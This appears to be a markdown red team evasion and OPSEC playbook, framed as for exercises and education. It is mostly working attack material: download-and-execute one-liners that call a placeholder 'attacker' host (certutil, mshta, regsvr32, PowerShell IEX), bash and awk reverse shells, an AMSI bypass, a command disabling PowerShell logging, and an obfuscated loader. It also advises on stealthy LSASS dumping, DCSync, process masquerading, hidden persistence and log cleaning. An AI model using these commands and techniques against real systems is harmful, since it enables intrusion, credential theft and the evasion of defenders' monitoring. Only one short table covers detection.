# 🔻 Red Team Evasion & OPSEC Playbook

## **Red Team Evasion & OPSEC Playbook — Stealth, Persistence, and Survival**

> 🧠 For controlled red team exercises, cyber ranges, and educational use.\
> The goal: **stay undetected**, execute efficiently, and leave minimal forensic trace.

***

### I. 🧩 Red Team Mindset

| Principle                | Meaning                                                       |
| ------------------------ | ------------------------------------------------------------- |
| **Stealth > Speed**      | Don’t rush enumeration or exploits. Slow = invisible.         |
| **Blend In**             | Look like normal system or user activity.                     |
| **Minimize Touchpoints** | Every command is a log entry. Use fewer, smarter ones.        |
| **Operate in Memory**    | Avoid writing files to disk; live off the land.               |
| **Compartmentalize**     | Separate infrastructure for staging, payloads, C2, and exfil. |
| **Fail Quietly**         | If something breaks, fix it silently. No panic scripts.       |

***

### II. 🧱 Execution Visibility Layers

| Layer            | Monitored By                  | Logs / Sensors                     |
| ---------------- | ----------------------------- | ---------------------------------- |
| **Command Line** | Shell history, Sysmon, Auditd | process creation logs              |
| **File System**  | AV scanners, FIM agents       | file writes, temp dirs             |
| **Network**      | IDS/IPS, firewalls            | outbound connections               |
| **Memory**       | EDR, behavioral analysis      | in-memory DLLs, injection patterns |
| **Credentials**  | LSA, SAM, Kerberos            | authentication logs                |

🧠 Always test your commands against all 5 visibility layers.

***

### III. 💻 Living Off the Land (LOLBins / LOLScripts)

#### 🪟 Windows

| Binary           | Use                          | Example                                                                           |
| ---------------- | ---------------------------- | --------------------------------------------------------------------------------- |
| `certutil.exe`   | Download / encode            | `certutil -urlcache -split -f http://attacker/payload.exe payload.exe`            |
| `bitsadmin.exe`  | Background download          | `bitsadmin /transfer job http://attacker/payload.exe C:\Users\Public\payload.exe` |
| `mshta.exe`      | Execute HTA (remote script)  | `mshta http://attacker/payload.hta`                                               |
| `rundll32.exe`   | Execute DLL payload          | `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"`                         |
| `wmic.exe`       | Execute remote process       | `wmic process call create "cmd /c calc.exe"`                                      |
| `regsvr32.exe`   | Bypass execution restriction | `regsvr32 /s /u /i:http://attacker/file.sct scrobj.dll`                           |
| `powershell.exe` | In-memory scripts            | `IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')`      |

#### 🐧 Linux

| Binary      | Use              | Example                                                                                       |
| ----------- | ---------------- | --------------------------------------------------------------------------------------------- |
| `curl/wget` | Download files   | \`curl [http://attacker/payload.sh](http://attacker/payload.sh)                               |
| `bash`      | Inline payload   | `bash -i >& /dev/tcp/attacker/4444 0>&1`                                                      |
| `awk/socat` | Reverse shell    | `awk 'BEGIN {s="/inet/tcp/0/attacker/4444";while(42){...}}'`                                  |
| `python3`   | In-memory loader | `python3 -c 'import urllib.request,os;exec(urllib.request.urlopen("http://x/sh.py").read())'` |

🧠 LOLBins = zero downloads, zero alerts. Learn them, chain them.

***

### IV. 🧠 Command & Control (C2) Evasion

| Technique                | Description                         | Example                                                |
| ------------------------ | ----------------------------------- | ------------------------------------------------------ |
| **Domain Fronting**      | Mask C2 through allowed CDN domains | `cdn.microsoft.com` front with `yourc2.cloudfront.net` |
| **DNS Tunneling**        | Encode data in DNS queries          | `iodine`, `dnscat2`                                    |
| **HTTP/HTTPS Beaconing** | Use web traffic patterns            | Random sleep, user-agent mimic                         |
| **SMB/Named Pipe C2**    | Internal stealth channels           | Sliver/Empire named pipes                              |
| **Encrypted Channels**   | TLS + domain-like names             | Avoid plaintext callbacks                              |

🧩 Configure random jitter:

> “Check in every 300s ±30%” → no beacon pattern.

***

### V. ⚙️ Antivirus / EDR Bypass Strategies

| Layer                    | Bypass Strategy                                       |
| ------------------------ | ----------------------------------------------------- |
| **Static Signature**     | Encode / compress / pack payloads                     |
| **Heuristic / Behavior** | Split stages, delay exec, sandbox checks              |
| **Memory Scanning**      | Reflective DLL injection, PowerShell in-memory loader |
| **Script Block Logging** | Obfuscate PowerShell, AMSI patch                      |
| **Binary Reputation**    | Use legitimate signed binaries                        |
| **Sysmon / ETW**         | Unhook or disable event tracing carefully (lab-only)  |

#### 🧰 Tools

| Tool                                 | Use                           |
| ------------------------------------ | ----------------------------- |
| **Invoke-Obfuscation**               | PowerShell obfuscation        |
| **Donut**                            | .NET shellcode loader         |
| **ScareCrow / ShellcodeFluctuation** | AV/EDR-evasive executables    |
| **CactusTorch / SharpShooter**       | HTA/DLL stagers               |
| **DefenderCheck**                    | Test local Defender detection |
| **PEzor**                            | Linux payload obfuscator      |
| **HTran / Chisel**                   | Encrypted proxy channels      |

🧠 Goal: “no file writes, no command history, no signature triggers.”

***

### VI. 🔒 PowerShell & AMSI Evasion

#### 🔹 Disable Logging (Temporary)

```powershell
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0
```

#### 🔹 AMSI Patch (In-memory)

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

#### 🔹 Obfuscation Example

```powershell
$e='IEX(New-Object Net.WebClient).DownloadString("http://attacker/p.ps1")'
$e -replace "IEX","I`EX" | iex
```

#### 🧠 Rule

> Don’t disable globally — patch **per session**; it’s stealthier.

***

### VII. 🧩 Fileless Execution Techniques

| Technique                   | Description                     | Example                                                            |
| --------------------------- | ------------------------------- | ------------------------------------------------------------------ |
| **PowerShell IEX**          | Load from web to memory         | `IEX(New-Object Net.WebClient).DownloadString()`                   |
| **WMI**                     | Execute script in memory        | `wmic process call create "powershell -enc ..."`                   |
| **Reflective Injection**    | Load DLLs directly into process | `Invoke-ReflectivePEInjection`                                     |
| **HTA + mshta**             | Inline script loader            | `mshta http://attacker/payload.hta`                                |
| **.NET Assembly Execution** | Load EXE as Assembly            | `[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("file.exe"))` |
| **Python / Bash Inline**    | Memory-only loader              | `python3 -c 'exec(open("/dev/shm/x").read())'`                     |

🧠 Fileless = zero AV signature, near-zero forensics.

***

### VIII. 🧠 Credential Operations OPSEC

| Action           | Stealth Technique                                        |
| ---------------- | -------------------------------------------------------- |
| Dumping LSASS    | Duplicate handle, suspend process, or use API-based dump |
| DCSync           | Use low-traffic hours, limit query to 1–2 users          |
| Mimikatz         | Load in-memory only; self-delete binary                  |
| Kerberos Tickets | Rename `.kirbi` → `.dat`; exfil via encrypted channel    |
| Pass-the-Hash    | Reuse with Impacket silently (`-no-pass` mode)           |

🧩 Always verify with:

```powershell
Get-WinEvent -LogName Security | findstr "4624"
```

***

### IX. 🧰 Process & Service Masquerading

| Type                      | Trick                                                   |
| ------------------------- | ------------------------------------------------------- |
| **Process Name**          | Rename to `svchost.exe`, `winupdate.exe`, `dllhost.exe` |
| **Parent Spoofing**       | Launch child under explorer.exe / services.exe          |
| **Service Description**   | Legit-looking names + delays                            |
| **Command Line Cloaking** | Use PowerShell base64 encoded mode                      |
| **DLL Hijack / Sideload** | Place malicious DLL in trusted app folder               |

🧠 “Legitimate name ≠ legitimate behavior” — mimic normal processes.

***

### X. 🧠 Network & Traffic Evasion

| Technique             | Example                                   | Purpose                         |
| --------------------- | ----------------------------------------- | ------------------------------- |
| **HTTP Beaconing**    | Regular-looking requests                  | Blends with web traffic         |
| **Encrypted Tunnels** | SSH / TLS / VPN / HTTPS                   | Hide payloads                   |
| **Proxy Chains**      | SOCKS through pivot                       | Avoid direct connections        |
| **Custom User-Agent** | `Mozilla/5.0` or app mimic                | Avoid network anomaly detection |
| **Steganography C2**  | Hide commands in images / DNS TXT records | Covert comms                    |

🧠 Don’t beacon from DCs directly — stage from non-critical servers.

***

### XI. 🧩 Persistence Without Detection

| Method                      | Description                  | OPSEC Risk |
| --------------------------- | ---------------------------- | ---------- |
| **Registry Run Key (HKCU)** | Executes on user login       | Medium     |
| **WMI Event Subscription**  | Triggers silently            | Low        |
| **Scheduled Task (Hidden)** | Executes on time / logon     | Medium     |
| **DLL Hijack**              | Triggers with legitimate app | Low        |
| **Service Install**         | Visible in `services.msc`    | High       |
| **GPO Script Abuse**        | Domain-level persistence     | High       |

🧠 Prefer WMI or DLL-based persistence over registry/service in high-monitoring environments.

***

### XII. 🧠 OPSEC Best Practices

| Category             | Discipline                                                 |
| -------------------- | ---------------------------------------------------------- |
| **Infrastructure**   | Separate servers for C2, staging, payload delivery, exfil. |
| **Data Handling**    | Never store creds or tickets in plaintext.                 |
| **Logs & Telemetry** | Collect only minimal host logs; sanitize before exfil.     |
| **Time Windows**     | Operate during business hours for noise blending.          |
| **Attribution**      | Avoid unique tools / payload names / metadata.             |
| **Version Control**  | Keep clean & dirty builds separate.                        |
| **Testing**          | Validate payloads on isolated VMs before deployment.       |

🧠 Red Team = “Assume you are being watched.”

***

### XIII. 🔒 Blue Team Correlation & Counter-Detection

| Activity             | Detection          | Log / Event        |
| -------------------- | ------------------ | ------------------ |
| PowerShell execution | ScriptBlockLogging | 4104               |
| WMI process creation | WMI-Activity       | 5858               |
| LSASS dump           | Sysmon             | 10                 |
| Registry change      | Sysmon             | 13                 |
| Service creation     | System             | 7045               |
| Network beacon       | Firewall / IDS     | abnormal patterns  |
| AMSI bypass          | AMSI alerts        | Defender telemetry |

***

### XIV. 🧰 Red Team “Invisible Loadout”

| Tool                                        | Description              |
| ------------------------------------------- | ------------------------ |
| **Covenant / Sliver / Cobalt Strike (lab)** | C2 with OPSEC controls   |
| **Donut / PEzor**                           | Shellcode loaders        |
| **Chisel / SSHuttle / HTran**               | Network proxy tunneling  |
| **SharpHide / Invoke-Obfuscation**          | Execution cloaking       |
| **Ghostpack / Seatbelt**                    | In-memory enumeration    |
| **Powershell Empire / PoshC2**              | Modular agent frameworks |
| **Metasploit (custom handler)**             | Lab C2 for automation    |

***

### XV. 🧠 Final Red Team Loop

```
1️⃣  Gain foothold (minimal tools)
2️⃣  Enumerate with native commands
3️⃣  Execute payloads in-memory
4️⃣  Blend network traffic (proxy, TLS)
5️⃣  Persist quietly (WMI/DLL)
6️⃣  Exfil minimal data (encrypted)
7️⃣  Clean logs, restore state
8️⃣  Write post-op report for lessons
```

***

